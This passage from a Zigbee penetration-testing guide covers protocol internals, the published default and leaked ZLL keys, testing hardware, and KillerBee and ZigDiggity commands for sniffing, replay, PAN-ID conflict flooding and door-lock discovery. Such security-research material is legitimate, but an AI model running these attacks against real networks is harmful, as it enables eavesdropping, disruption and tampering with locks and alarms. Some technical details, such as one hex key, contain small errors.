# 🐝 Zigbee Protocol — Complete Penetration Testing Guide
### End-to-End: From IEEE 802.15.4 Internals → Full Attack Surface → All Test Cases

> **⚠️ Legal Disclaimer:** This guide is intended solely for authorized security researchers, IoT security professionals, and developers performing assessments on hardware and networks they own or have explicit written permission to test. Unauthorized interception, injection, or jamming of Zigbee signals may violate the Computer Fraud and Abuse Act (CFAA), Electronic Communications Privacy Act (ECPA), FCC regulations (47 U.S.C. § 333), and equivalent laws globally. Always obtain written authorization before testing. All tools, techniques, and CVEs referenced originate from publicly disclosed, conference-presented, peer-reviewed security research (DEF CON, Black Hat, ACM CCS, WiSec, IEEE).

---

## 📋 Table of Contents

1. [Understanding Zigbee — Deep Protocol Internals](#1-understanding-zigbee--deep-protocol-internals)
2. [IEEE 802.15.4 Physical & MAC Layer](#2-ieee-80215-4-physical--mac-layer)
3. [Zigbee Network Layer Architecture](#3-zigbee-network-layer-architecture)
4. [Zigbee Application Layer — ZCL, Clusters, Profiles](#4-zigbee-application-layer--zcl-clusters-profiles)
5. [Security Architecture — Keys, Trust Center, AES-128](#5-security-architecture--keys-trust-center-aes-128)
6. [Commissioning & Joining Procedures](#6-commissioning--joining-procedures)
7. [Attack Surface Overview](#7-attack-surface-overview)
8. [Hardware Tools for Penetration Testing](#8-hardware-tools-for-penetration-testing)
9. [Software Tools & Frameworks](#9-software-tools--frameworks)
10. [Pre-Engagement & Scoping](#10-pre-engagement--scoping)
11. [Phase 1 — Passive Reconnaissance & Sniffing](#11-phase-1--passive-reconnaissance--sniffing)
12. [Phase 2 — Active Network Discovery & Mapping](#12-phase-2--active-network-discovery--mapping)
13. [Phase 3 — Key Extraction & Cryptographic Attacks](#13-phase-3--key-extraction--cryptographic-attacks)
14. [Phase 4 — Touchlink Commissioning Attacks](#14-phase-4--touchlink-commissioning-attacks)
15. [Phase 5 — Network Joining & Rejoining Attacks](#15-phase-5--network-joining--rejoining-attacks)
16. [Phase 6 — Application Layer & ZCL Attacks](#16-phase-6--application-layer--zcl-attacks)
17. [Phase 7 — Replay Attacks](#17-phase-7--replay-attacks)
18. [Phase 8 — Denial of Service Attacks](#18-phase-8--denial-of-service-attacks)
19. [Phase 9 — Firmware & OTA Attacks](#19-phase-9--firmware--ota-attacks)
20. [Phase 10 — Physical Layer & Hardware Attacks](#20-phase-10--physical-layer--hardware-attacks)
21. [Phase 11 — Gateway, Hub & MQTT Exploitation](#21-phase-11--gateway-hub--mqtt-exploitation)
22. [Phase 12 — Fuzzing Zigbee Implementations](#22-phase-12--fuzzing-zigbee-implementations)
23. [Complete Test Case Matrix](#23-complete-test-case-matrix)
24. [CVEs & Known Vulnerabilities](#24-cves--known-vulnerabilities)
25. [Lab Setup Guide](#25-lab-setup-guide)
26. [Reporting & Remediation](#26-reporting--remediation)
27. [Legal & Ethical Framework](#27-legal--ethical-framework)
28. [References & Trusted Sources](#28-references--trusted-sources)

---

## 1. Understanding Zigbee — Deep Protocol Internals

### 1.1 What Is Zigbee?

Zigbee is a low-power, low-data-rate wireless mesh networking standard built atop the IEEE 802.15.4 radio specification. It was created by the Zigbee Alliance (now the Connectivity Standards Alliance, or CSA) and targets applications requiring long battery life, low cost, and reliable mesh connectivity in smart home, industrial IoT, and commercial building automation.

**Key facts for penetration testers:**
- Operates on **2.4 GHz globally** (also 868 MHz in EU, 915 MHz in USA — but 2.4 GHz is by far the most deployed)
- Range: **10–100m** indoors (up to 1.5km in line-of-sight with mesh relay)
- Data rate: **250 kbps** at 2.4 GHz; 20 kbps at 868 MHz; 40 kbps at 915 MHz
- Network size: **up to 65,000 nodes** per network (16-bit short address space)
- Encryption: AES-128 with symmetric keys — no public-key cryptography until recently
- Developed by: Connectivity Standards Alliance (CSA), formerly Zigbee Alliance
- Specifications: freely downloadable from https://csa-iot.org/developer-resource/specifications-download-request/
- **Shares the 2.4 GHz band with Wi-Fi and Bluetooth** — coexistence is a real concern

### 1.2 Zigbee Standards & Versions

| Standard | Year | Key Change |
|----------|------|-----------|
| Zigbee 2004 | 2004 | Original release |
| Zigbee 2006 | 2006 | Simplified stack |
| Zigbee 2007 | 2007 | Zigbee Pro (full mesh, source routing, many-to-one) |
| Zigbee Light Link (ZLL) | 2012 | Touchlink commissioning, leaked master key |
| Zigbee 3.0 | 2016 | Unified profile; ZLL merged into HA; install codes |
| Zigbee Direct | 2022 | Bluetooth LE provisioning for Zigbee devices |
| Matter (based on Zigbee IP) | 2022+ | IP-based, uses Thread instead of Zigbee 802.15.4 |

> **Critical for testers:** Zigbee 3.0 devices can still use the insecure "well-known" default Trust Center Link Key (`ZigBeeAlliance09`) if install codes are not enforced. The vast majority of deployed consumer devices still use this default.

### 1.3 Protocol Stack

```
┌─────────────────────────────────────────────────────────────────────────┐
│  Application Layer │ ZCL (Zigbee Cluster Library)                        │
│                    │ Clusters: On/Off, Lock, IAS, OTA, Door Lock, etc.   │
├─────────────────────────────────────────────────────────────────────────┤
│  Application       │ APS (Application Support Sub-layer)                 │
│  Framework         │ APS Security: AES-128-CCM* with link keys           │
│                    │ Zigbee Device Object (ZDO): device management        │
├─────────────────────────────────────────────────────────────────────────┤
│  Network Layer     │ NWK: routing, mesh topology, address assignment      │
│   (Zigbee)         │ NWK Security: AES-128-CCM* with network key          │
│                    │ Source routing, Many-to-One routing (Zigbee Pro)     │
├─────────────────────────────────────────────────────────────────────────┤
│  Data Link Layer   │ IEEE 802.15.4 MAC                                    │
│  (IEEE 802.15.4)   │ CSMA-CA, ACK, beacons, PAN ID, superframe            │
├─────────────────────────────────────────────────────────────────────────┤
│  Physical Layer    │ IEEE 802.15.4 PHY                                    │
│  (IEEE 802.15.4)   │ O-QPSK DSSS at 2.4 GHz; BPSK at 868/915 MHz        │
└─────────────────────────────────────────────────────────────────────────┘
```

### 1.4 Node Types

| Type | Abbreviation | Role | Can Sleep? |
|------|-------------|------|-----------|
| Coordinator | ZC | Creates/manages network; Trust Center (usually) | No |
| Router | ZR | Relays traffic; always listening | No |
| End Device | ZED | Leaf node; cannot route | Yes (battery) |
| Zigbee Direct Device | ZDD | BLE-provisioned Zigbee 3.0+ device | Varies |

**Coordinator is the highest-value target** — compromise grants full network key control, all device associations, and Trust Center authority.

---

## 2. IEEE 802.15.4 Physical & MAC Layer

### 2.1 Channel Plan (2.4 GHz — 16 Channels)

```
Channel  11: 2405 MHz  ← Most common Zigbee channel (avoids Wi-Fi ch1)
Channel  12: 2410 MHz
Channel  13: 2415 MHz
Channel  14: 2420 MHz
Channel  15: 2425 MHz  ← Widely used (avoids Wi-Fi ch6)
Channel  16: 2430 MHz
Channel  17: 2435 MHz
Channel  18: 2440 MHz
Channel  19: 2445 MHz
Channel  20: 2450 MHz
Channel  21: 2455 MHz  ← Used to avoid Wi-Fi ch11
Channel  22: 2460 MHz
Channel  23: 2465 MHz
Channel  24: 2470 MHz
Channel  25: 2475 MHz
Channel  26: 2480 MHz  ← EU popular choice (outside Wi-Fi band)
```

**Pentester note:** Scan ALL 16 channels. Zigbee networks pick channels to avoid 2.4 GHz Wi-Fi (channels 1/6/11), so channels 15, 20, 25, 26 are very common.

### 2.2 IEEE 802.15.4 Frame Structure

```
 Octets:  2       1      0/2    0/2/8    0/2    0/2/8   variable   2
┌────────┬──────┬──────┬───────┬───────┬───────┬────────┬─────────┐
│ Frame  │ Seq  │ Dst  │  Dst  │  Src  │  Src  │ Frame  │   FCS   │
│ Control│ Num  │ PAN  │ Addr  │  PAN  │ Addr  │Payload │ (CRC-16)│
└────────┴──────┴──────┴───────┴───────┴───────┴────────┴─────────┘
```

**Frame Control bits (2 bytes):**
- Frame Type (3 bits): Beacon/Data/ACK/MAC Command
- Security Enabled (1 bit): MAC-layer security flag
- Frame Pending, ACK Request, PAN ID Compression
- Dest/Src Addressing Mode: 16-bit short or 64-bit extended (EUI-64)

**PAN ID:** 2-byte Personal Area Network identifier — Zigbee's network discriminator (equivalent to Z-Wave HomeID)

**EUI-64:** Every Zigbee device has a globally unique 64-bit IEEE address (burned into hardware at manufacture). This is permanently associated with the device and revealed in unencrypted join frames — useful for device fingerprinting.

### 2.3 Beacon Frame — The Scanner's Gold Mine

Beacon frames are broadcast by coordinators and routers during the association process. They are **always unencrypted** and reveal:
- PAN ID (network identifier)
- Channel
- Router's short address and EUI-64
- Whether network is accepting associations (`Association Permit` bit)
- Zigbee protocol version
- Stack profile

```bash
# Capture beacons on channel 11 with KillerBee
zbstumbler -c 11 -v    # -v for verbose — shows PAN IDs and addresses
```

---

## 3. Zigbee Network Layer Architecture

### 3.1 Addressing

**Short Address (16-bit):** Assigned by coordinator on join; used for routing  
**Extended Address (EUI-64):** Permanent hardware address; used for association  
**Group Address (16-bit):** For multicast commands (e.g., "all lights off")  
**Broadcast Addresses:**
- `0xFFFF` — all devices
- `0xFFFD` — all non-sleeping devices
- `0xFFFC` — all routers and coordinator
- `0xFFFB` — reserved

### 3.2 NWK Frame Structure

```
┌─────────┬──────────┬───────┬──────┬──────────┬────────────────────────┐
│ NWK     │ Dst Short│ Src   │ Radius│ Seq Num │ NWK Payload            │
│ Control │ Address  │ Short │ (TTL) │         │ (APS frame, if present)│
│ 2 bytes │ 2 bytes  │ 2bytes│ 1 byte│ 1 byte  │                        │
└─────────┴──────────┴───────┴──────┴──────────┴────────────────────────┘
```

**NWK Control Field bits:**
- Frame Type: Data/NWK Command/Inter-PAN
- Protocol Version
- Discover Route: Suppress/Enable
- Multicast Flag
- Security: NWK-layer AES-128-CCM* encryption
- Source Route: Source routing sub-frame present
- Dest/Src IEEE Address present

**Critical:** NWK header (destination address, source address) is always **in the clear** even when security is enabled — the payload is encrypted but routing metadata is visible. This enables traffic analysis.

### 3.3 Mesh Routing

Zigbee Pro supports:
- **AODV-based routing:** Route discovery via broadcast RREQ/RREP
- **Many-to-One routing:** Routers broadcast route records toward the coordinator
- **Source routing:** Coordinator embeds full hop list in frames
- **Broadcast routing:** Frames flooded to all routers with duplicate rejection

**For testers:** Many-to-One route records expose the entire network topology in plaintext (unencrypted NWK headers), making topology mapping trivial.

---

## 4. Zigbee Application Layer — ZCL, Clusters, Profiles

### 4.1 APS (Application Support Sub-Layer)

The APS layer sits between the network layer and ZCL. Key components:
- **APS Data Service:** Reliable/unreliable data delivery between endpoints
- **APS Security:** Optional AES-128-CCM* encryption using link keys (independent of NWK encryption)
- **Binding Table:** Associates source endpoints to destination endpoints
- **Group Table:** Maps group addresses to local endpoints

### 4.2 Endpoints

Each Zigbee device can have up to 240 application endpoints (like logical sub-devices). Each endpoint implements one Application Profile.

**Special endpoints:**
- Endpoint 0: ZDO (Zigbee Device Object) — device management, discovery, binding
- Endpoint 1–240: Application endpoints (clusters)
- Endpoint 255: Broadcast to all endpoints

### 4.3 Zigbee Cluster Library (ZCL)

ZCL defines "clusters" — collections of attributes and commands for specific functionality.

**High-value clusters for penetration testing:**

| Cluster ID | Name | Direction | Security Risk |
|-----------|------|-----------|--------------|
| 0x0000 | Basic | Both | INFO — reveals device info unauthenticated |
| 0x0001 | Power Configuration | Server | Battery/power status |
| 0x0003 | Identify | Both | Force device to identify (flash, beep) |
| 0x0004 | Groups | Both | Group membership manipulation |
| 0x0005 | Scenes | Both | Recall stored device states |
| 0x0006 | On/Off | Both | **CRITICAL** if unencrypted |
| 0x0008 | Level Control | Both | Light dimming control |
| 0x0101 | Door Lock | Both | **CRITICAL** — lock/unlock doors |
| 0x0201 | Thermostat | Both | Temperature setpoint control |
| 0x0400 | Illuminance Measurement | Server | Sensor data |
| 0x0406 | Occupancy Sensing | Server | Occupancy detection (privacy) |
| 0x0500 | IAS Zone | Both | Security alarm zones |
| 0x0501 | IAS ACE | Both | **CRITICAL** — arm/disarm alarms |
| 0x0502 | IAS Warning Device | Both | Siren control |
| 0x0019 | OTA Upgrade | Both | **HIGH** — firmware update |
| 0x0102 | Window Covering | Both | Blind/shade control |
| 0x0B05 | Diagnostics | Server | Network diagnostics |

### 4.4 Application Profiles

| Profile ID | Name | Target Domain |
|-----------|------|--------------|
| 0x0104 | Home Automation (HA) | General smart home |
| 0x0108 | ZigBee Light Link (ZLL) | Connected lighting |
| 0x0109 | ZigBee Retail Services | Retail |
| 0xC059 | ZigBee Smart Energy (ZSE) | Smart grid/meters |
| 0x0105 | Commercial Building Automation | HVAC, lighting |

**Security note:** ZSE uses certificate-based security (unique per-device) — much harder to attack. HA and ZLL use the weak default key model.

---

## 5. Security Architecture — Keys, Trust Center, AES-128

### 5.1 Security Key Hierarchy

Zigbee uses three types of symmetric keys, all AES-128:

```
┌───────────────────────────────────────────────────────────────────────┐
│  KEY TYPE         │ SCOPE       │ PURPOSE              │ STORED WHERE  │
├───────────────────┼─────────────┼──────────────────────┼───────────────┤
│ Network Key       │ Entire NWK  │ NWK-layer encryption │ All nodes     │
│ (NWK Key)         │ (broadcast) │ Protects NWK payload │               │
├───────────────────┼─────────────┼──────────────────────┼───────────────┤
│ Link Key          │ Pair of     │ APS-layer encryption  │ Both peers    │
│ (APS Key)         │ devices     │ End-to-end between   │               │
│                   │             │ specific endpoints   │               │
├───────────────────┼─────────────┼──────────────────────┼───────────────┤
│ Master Key        │ Pair of     │ Key Agreement         │ Both peers    │
│ (Legacy)          │ devices     │ (deprecated in 3.0)  │               │
└───────────────────┴─────────────┴──────────────────────┴───────────────┘
```

**Key Insight for Attackers:**
- Obtaining the **Network Key** decrypts all NWK-layer traffic in the network
- APS Link Keys provide additional protection for sensitive operations (door locks, alarms)
- Many consumer devices only use NWK-layer security; APS-layer security is often absent

### 5.2 Trust Center

The Trust Center (TC) is the network's security authority:
- Typically the Coordinator (NodeID 0x0000)
- Issues network keys to joining devices
- Manages key updates
- Authenticates new devices

**Trust Center Modes:**
- **Centralized Security** (standard): All devices join via Trust Center; TC issues keys
- **Distributed Security** (Zigbee 3.0): Routers can form networks without a designated TC; less secure

### 5.3 Default Trust Center Link Key — THE Critical Weakness

When a new device joins a Zigbee network, the Network Key must be delivered from the Trust Center to the joining device. This delivery is encrypted using a **Trust Center Link Key (TCLK)**.

In Zigbee 2007/HA networks, the default TCLK is well-known and public:

```
Default Trust Center Link Key (Home Automation / Zigbee 3.0 default):
ASCII:   ZigBeeAlliance09
Hex:     5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39
```

**This means:** Any attacker within RF range during device joining can decrypt the Network Key from the key transport frame, because the encryption key (`ZigBeeAlliance09`) is publicly known.

**Zigbee Light Link (ZLL) Master Key** (leaked March 2015):
```
ZLL Master Key (leaked):
Hex:     9F:55:95:F1:02:57:C8:A9:65:37:0B:C2:2A:8B:02:44
```

This leaked key allows decryption of ZLL commissioning key transport frames from any captured pcap.

**Wireshark configuration for default key decryption:**
```
Edit → Preferences → Protocols → Zigbee NWK
Add key: 5A6967426565416C6C69616E636530 39 (HA default)
Add key: 9F5595F10257C8A965370BC22A8B0244 (ZLL leaked master key)
```

### 5.4 Install Codes (Zigbee 3.0 Improvement)

Zigbee 3.0 introduced **Install Codes** as a mechanism to generate a unique per-device link key, replacing the default `ZigBeeAlliance09` key for initial join.

**Install Code process:**
1. Device ships with a unique 16-byte install code (printed as QR code or label)
2. User enters/scans install code into coordinator
3. Coordinator derives a unique TCLK from install code via MMO hash: `LinkKey = MMO_Hash(InstallCode)`
4. Network Key is sent encrypted with this unique TCLK
5. After successful join, TCLK is replaced with a fresh random key

**Attack implication:** If install codes are NOT enforced (many consumer Zigbee hubs don't enforce them), devices fall back to `ZigBeeAlliance09`. Test whether install codes are required.

### 5.5 Frame Counter Anti-Replay

Zigbee uses a 32-bit monotonically increasing frame counter in NWK and APS security headers to prevent replay attacks. Receivers reject frames with counters ≤ the last accepted counter.

**Weakness:** Frame counters are stored in NVM. If a device reboots to factory defaults, its counter resets to 0, potentially making all previously captured frames valid for replay (depending on receiver behavior).

---

## 6. Commissioning & Joining Procedures

### 6.1 Centralized Security Join (Standard)

```
New Device                         Coordinator / Trust Center
    │                                           │
    │──── IEEE 802.15.4 Beacon Request ────────►│
    │◄─── Beacon Response (PAN ID, assoc. perm) │
    │                                           │
    │──── Association Request ─────────────────►│ (MAC layer, unencrypted)
    │◄─── Association Response (short addr) ────│ (MAC layer, unencrypted)
    │                                           │
    │─── Transport Key Request ────────────────►│ (NWK layer, possibly encrypted)
    │◄── Transport Key (Network Key) ───────────│ **ENCRYPTED WITH TCLK**
    │    (If TCLK = ZigBeeAlliance09, attacker  │
    │     can decrypt this frame and get NWK key│
    │                                           │
    │──── Device Announce ─────────────────────►│ (broadcast, NWK layer)
```

### 6.2 Touchlink Commissioning (ZLL / Zigbee 3.0 optional)

Touchlink is a proximity-based commissioning procedure:
1. Initiator broadcasts an inter-PAN "Scan Request" on a fixed channel
2. Target device within proximity responds with "Scan Response" (includes RSSI-based proximity check)
3. Both devices use the **ZLL Master Key** (or a derived version) to encrypt/decrypt commissioning frames
4. Initiator can perform: factory reset, network join, channel change, device steal

**Critical vulnerability:** The ZLL Master Key was leaked in March 2015. Once leaked, **proximity cannot protect commissioning security** — any attacker with the master key can impersonate a legitimate initiator.

**Extended range attack:** Researchers demonstrated touchlink attacks from 130+ meters away using high-gain antennas, bypassing the proximity requirement entirely.

### 6.3 Distributed Security Network Formation

In Zigbee 3.0 distributed networks:
- Any router can form a new network or allow devices to join
- No central Trust Center
- Network key is generated locally by the router
- Weaker trust model — easier for attackers to inject rogue routers

---

## 7. Attack Surface Overview

```
┌──────────────────────────────────────────────────────────────────────┐
│                    ZIGBEE ATTACK SURFACE MAP                          │
└──────────────────────────────────────────────────────────────────────┘

IEEE 802.15.4 PHY/MAC ──── Passive sniffing all 16 channels
                           PAN ID discovery (beacons always unencrypted)
                           MAC address harvesting (EUI-64 always visible)
                           ACK spoofing (suppress device responses)
                           PAN ID conflict flood (destroy mesh network)
                           Beacon flood

Network Layer (NWK) ─────── Network Key interception (during join)
                            Default TCLK exploitation (ZigBeeAlliance09)
                            NWK traffic decryption (if key obtained)
                            Replay attacks (frame counter abuse)
                            Routing manipulation (source route injection)
                            Many-to-One route record poisoning

Touchlink Commissioning ─── Leaked ZLL master key exploitation
                            Factory reset of target devices
                            Device theft (join attacker's network)
                            Channel change (disrupts network)
                            Long-range touchlink (130m+ with directional antenna)

Application Layer (ZCL) ─── Unauthenticated cluster command injection
                            IAS Zone tamper (disarm alarms)
                            Door Lock cluster exploitation (unlock doors)
                            OTA update hijacking (malicious firmware)
                            ZCL attribute manipulation
                            Insecure cluster ID flooding (ACM CCS 2022)

Device Joining/Rejoining ── Rogue coordinator attack
                            Insecure rejoin exploitation (no auth)
                            Association flooding

Denial of Service ────────── PAN ID conflict flooding
                            ACK flooding (suppress legitimate comms)
                            Disassociation spoofing
                            Beacon flooding
                            Selective jamming (2.4 GHz, channel-specific)

Firmware / OTA ──────────── Unsigned OTA images (Zigbee OTA cluster)
                            Downgrade to vulnerable firmware
                            Memory extraction via JTAG/SWD

Hardware ─────────────────── CC2531/CC2652 chip extraction
                            NVM key dump (network key stored in flash)
                            Debug interface (SWD on TI chips)
                            UART key extraction

Gateway / Integration ────── Zigbee2MQTT API exploitation
                            Home Assistant Zigbee integration abuse
                            MQTT broker attacks
                            Zigbee Direct (BLE-based) attack surface
```

---

## 8. Hardware Tools for Penetration Testing

### 8.1 Dedicated Zigbee Radio Hardware (IEEE 802.15.4)

#### 🥇 River Loop ApiMote v4 (Recommended Primary Tool)
- **Manufacturer:** River Loop Security (open hardware)
- **GitHub:** https://github.com/riverloopsec/apimote
- **Purpose:** Full-featured KillerBee-compatible Zigbee security research hardware
- **Capabilities:** Sniff, inject, replay, jam (all channels simultaneously impossible; channel-by-channel)
- **Pre-flashed:** Comes with KillerBee firmware pre-loaded
- **Price:** Contact River Loop Security (team@riverloopsecurity.com)
- **Why it's #1:** Designed specifically for security research; only device with all KillerBee features fully supported; open hardware design

```bash
# Detect ApiMote
zbid    # Output: /dev/ttyUSBX   ApiMote v4

# Sniff channel 11
zbdump -c 11 -w capture.pcap -i /dev/ttyUSBX
```

#### 🥈 Texas Instruments CC2531 USB Dongle (Budget Essential)
- **Chip:** CC2531 (2.4 GHz IEEE 802.15.4/Zigbee transceiver)
- **Price:** ~$3–$10 USD (AliExpress/ITEAD)
- **Default firmware:** CC2531ZNP-Prod (coordinator mode)
- **KillerBee firmware:** Flash to enable injection + KillerBee tools
- **Sniffer firmware:** Available via TI PACKET-SNIFFER / ZBOSS
- **Limitation:** Lower sensitivity than ApiMote; requires reflashing for full capabilities

**Flash CC2531 with KillerBee firmware:**
```bash
# Method 1: Using CC Debugger (TI tool)
# Method 2: Using Raspberry Pi GPIO (most common, no CC Debugger needed)

# Step 1: Install flash tool
sudo apt-get install wiringpi
git clone https://github.com/jmichault/flash_cc2531
cd flash_cc2531

# Step 2: Wire CC2531 to Raspberry Pi GPIO:
# CC2531 Pin → Raspberry Pi GPIO
# DD    → GPIO 27 (pin 13)
# DC    → GPIO 11 (pin 23)
# /RST  → GPIO 17 (pin 11)
# GND   → GND
# VCC   → 3.3V

# Step 3: Download KillerBee firmware
wget https://github.com/riverloopsec/killerbee/raw/master/firmware/CC2531_KillerBee.hex

# Step 4: Erase and flash
./cc_erase
./cc_write CC2531_KillerBee.hex
```

**Flash CC2531 with sniffer firmware (for Wireshark capture):**
```bash
# Extract sniffer firmware from TI PACKET-SNIFFER installer
unzip swrc045z.zip -d PACKET-SNIFFER
7z e PACKET-SNIFFER/Setup_SmartRF_Packet_Sniffer_2.18.0.exe bin/general/firmware/sniffer_fw_cc2531.hex
sudo cc-tool -e -w sniffer_fw_cc2531.hex
```

#### 🥉 Texas Instruments CC2652R/CC2652P USB Dongle (Modern, Recommended)
- **Chip:** CC2652R (5 dBm) or CC2652P (20 dBm, power amplifier)
- **Examples:** SONOFF Zigbee 3.0 USB Dongle Plus, Electrolama zzh!, Tube's ZB coordinator
- **Price:** ~$15–$30 USD
- **Advantages over CC2531:**
  - Supports Zigbee 3.0 (vs Zigbee 1.2 of CC2531)
  - Larger network capacity (200+ vs 20 direct children)
  - Better sensitivity and range (especially CC2652P with PA)
  - No CC Debugger needed — flash via USB bootloader
  - Supports OpenThread, Zigbee, BLE simultaneously on some variants
- **KillerBee support:** Beta support available

```bash
# Flash CC2652R with coordinator firmware (for Zigbee2MQTT)
# No special hardware needed — USB bootloader
pip3 install cc2538-bsl
# Enter bootloader: hold BOOT button, plug USB
python3 cc2538-bsl.py -p /dev/ttyUSB0 -evw CC1352P2_CC2652P_launchpad_coordinator_20230507.hex
```

#### MoteIV Tmote Sky / TelosB
- **Type:** Research mote with CC2420 radio (2.4 GHz IEEE 802.15.4)
- **KillerBee support:** Full support via goodfet.tos firmware
- **Use Case:** Academic research platform; good for firmware extraction research
- **Price:** ~$100–$200 USD (surplus)

```bash
# Flash TelosB with KillerBee firmware via USB
cd killerbee/firmware
./flash_goodfet.sh
```

#### Atmel RZ RAVEN USB Stick (RZUSBSTICK)
- **Chip:** AT86RF230 (2.4 GHz 802.15.4)
- **KillerBee support:** Full support with custom firmware
- **Price:** ~$40 USD (when available)
- **Reflashing required:** Must flash KillerBee firmware for injection capability
- **Note:** Older hardware; ApiMote preferred for new setups

#### RaspBee II (for Raspberry Pi)
- **Type:** GPIO Zigbee radio shield for Raspberry Pi (all models)
- **Chip:** ConBee/RaspBee (Dresden Elektronik, based on ATmega256RFR2)
- **Price:** ~$35 USD
- **Use with ZigDiggity:** Raspberry Pi + RaspBee = portable Zigbee pentest station
- **Software:** deCONZ, ZigDiggity, Zigbee2MQTT

```bash
# ZigDiggity + RaspBee setup
git clone https://github.com/BishopFox/zigdiggity
cd zigdiggity
sudo ./install.sh
# Requires RaspBee II plugged into Pi GPIO
```

#### ConBee II USB Stick (Dresden Elektronik)
- **Type:** USB Zigbee coordinator
- **Chip:** ATmega256RFR2 + EFM32
- **Price:** ~$40 USD
- **Software:** deCONZ REST API, Home Assistant, ZigDiggity compatible
- **Use Case:** Authorized network assessment via deconz API; ZigDiggity attacks

### 8.2 SDRs for Zigbee (Advanced / Supplementary)

#### HackRF One
- **Frequency:** 1 MHz – 6 GHz (covers 2.4 GHz)
- **Use Case for Zigbee:** Visualization with GNU Radio, jamming research (authorized, Faraday cage), signal analysis
- **Limitation:** GNU Radio Zigbee receivers exist but are less mature than dedicated hardware
- **Price:** ~$340 USD
- **GNU Radio Zigbee block:** `gr-ieee802-15-4` by David Inman

```bash
# Install GNU Radio IEEE 802.15.4 module
git clone https://github.com/bastibl/gr-ieee802-15-4
cd gr-ieee802-15-4 && mkdir build && cd build
cmake .. && make && sudo make install
```

#### YARD Stick One
- **Frequency:** 300–928 MHz — does NOT cover 2.4 GHz
- **Use for Zigbee:** Only useful for 868/915 MHz Zigbee (rare)
- **For 2.4 GHz Zigbee:** Use dedicated hardware above

#### Ettus USRP B210
- **Frequency:** 70 MHz – 6 GHz, full duplex
- **Use Case:** Research-grade IEEE 802.15.4 signal analysis, protocol development
- **Price:** ~$1,119 USD
- **Required for Z3sec:** Z3sec framework supports USRP B200/B210

### 8.3 Hardware for Firmware Analysis

| Tool | Purpose | Price |
|------|---------|-------|
| CC Debugger (TI) | Flash/debug CC2531, CC2530, CC2538 | ~$50 |
| J-Link EDU | JTAG/SWD for ARM Cortex-M chips | ~$60 |
| SEGGER J-Link Pro | Professional JTAG/SWD debugger | ~$400+ |
| Bus Pirate | UART/SPI/I2C analysis | ~$30 |
| Saleae Logic 8 | Digital logic analyzer | ~$400 |
| CH341A | SPI/I2C flash programmer | ~$15 |
| Hot air station | Chip desoldering | ~$50–$300 |

### 8.4 Recommended Lab Kit (3 Tiers)

**Budget Kit (~$100):**
- TI CC2531 USB dongle × 2 (one coordinator, one sniffer) — ~$10
- Raspberry Pi 3/4 — ~$35
- Jumper cables for GPIO flashing — ~$5
- CC2652R USB dongle (SONOFF Zigbee 3.0 Plus) — ~$20
- USB hub — ~$10

**Professional Kit (~$400):**
- River Loop ApiMote v4 (contact River Loop) — primary attack tool
- CC2652P USB dongle — high-power coordinator
- RaspBee II + Raspberry Pi 4 — ZigDiggity platform
- Bus Pirate — hardware analysis
- J-Link EDU — firmware extraction

**Research-Grade Kit (~$1,500+):**
- Ettus USRP B210 — precision signal work
- ApiMote v4 × 2 — simultaneous attack + capture
- HackRF One — spectrum visualization
- CC Debugger (TI) — authentic chip debugging
- Saleae Logic Pro 16 — digital analysis
- Full target device collection (various Zigbee products)

---

## 9. Software Tools & Frameworks

### 9.1 KillerBee Framework (Primary Tool)

**GitHub:** https://github.com/riverloopsec/killerbee  
**Author:** River Loop Security  
**Language:** Python 3 (migrating from Python 2)  
**Hardware:** ApiMote v4, CC2531 (w/ KillerBee firmware), TelosB, Tmote Sky, RZ RAVEN  
**Description:** The definitive IEEE 802.15.4/Zigbee security research toolkit with complete attack suite

**Installation:**
```bash
# Install dependencies (Ubuntu/Kali)
sudo apt-get install python3 python3-pip libusb-1.0-0 python3-usb python3-serial libgcrypt-dev

# Clone and install KillerBee
git clone https://github.com/riverloopsec/killerbee
cd killerbee
pip3 install pycrypto pyserial pyusb
sudo python3 setup.py install

# Verify installation
zbid    # List detected interfaces
```

**KillerBee Tool Reference:**

```bash
# ── IDENTIFICATION & SETUP ──────────────────────────────────────────────
zbid                     # List available KillerBee interfaces
zbid -s                  # Show details of all interfaces

# ── PASSIVE CAPTURE ─────────────────────────────────────────────────────
zbdump -c 11 -w zigbee.pcap              # Capture on channel 11 to pcap
zbdump -c 11 -w zigbee.pcap -t 60       # Capture for 60 seconds
zbwireshark -c 15                        # Live capture → pipe to Wireshark
# Open Wireshark: File → Open pipe (name from zbwireshark output)

# ── NETWORK DISCOVERY ───────────────────────────────────────────────────
zbstumbler                      # Active scan all channels, find PAN IDs
zbstumbler -c 11                # Scan specific channel
zbstumbler -c 11 -v             # Verbose: EUI-64 addresses, signal strength
zbfind -c 11                    # GUI tool for RSSI-based device location

# ── KEY EXTRACTION ──────────────────────────────────────────────────────
zbdsniff -c 11 -w capture.pcap   # Capture + attempt key sniffing
zbgoodfind -p capture.pcap -m memdump.bin  # Find key in memory dump

# ── REPLAY ATTACKS ──────────────────────────────────────────────────────
zbreplay -f capture.pcap -c 11   # Replay entire capture on channel 11

# ── DENIAL OF SERVICE ───────────────────────────────────────────────────
zbpanidconflictflood -c 11      # ⚠️ PAN ID conflict flood — destroys ALL Zigbee on channel
zborphannotify -c 11 --dst 0xFFFF   # Orphan notification flood
zbrealign -c 11                  # Spoof PAN realignment frames

# ── INJECTION ───────────────────────────────────────────────────────────
# Using Python + KillerBee library for custom injection (see attack sections)

# ── HELPER TOOLS ────────────────────────────────────────────────────────
zbconvert -r raw.pcap -w zigbee.pcap   # Convert pcap formats
zbopenear -c 11 -w capture.pcap        # Open-ear passive capture (passive mode)
```

### 9.2 ZigDiggity 2.0 (Bishop Fox)

**GitHub:** https://github.com/BishopFox/zigdiggity  
**Presented at:** Black Hat USA 2019 ARSENAL LAB  
**Authors:** Matt Gleason & Francis Brown (Bishop Fox)  
**Hardware:** RaspBee (Raspberry Pi) or ConBee II  
**Language:** Python 3 + Scapy  
**Key Feature:** Single-device attacks — does not require two radios

**Installation:**
```bash
# On Raspberry Pi with RaspBee II
git clone https://github.com/BishopFox/zigdiggity
cd zigdiggity

# Enable UART for RaspBee: sudo raspi-config → Interface Options → Serial
# Disable login shell over serial, enable hardware serial

# Install dependencies
sudo pip3 install scapy pyserial

# Patch Scapy Zigbee layer (required)
sudo cp patch/zigbee.py /usr/local/lib/python3.X/dist-packages/scapy/layers/zigbee.py

sudo python3 setup.py install
```

**ZigDiggity Scripts:**
```bash
# Find nearby Zigbee networks
python3 beacon.py -c 11

# Identify door locks on a channel
python3 find_locks.py -c 11 -t 60

# ACK attack — suppress device acknowledgements (DoS)
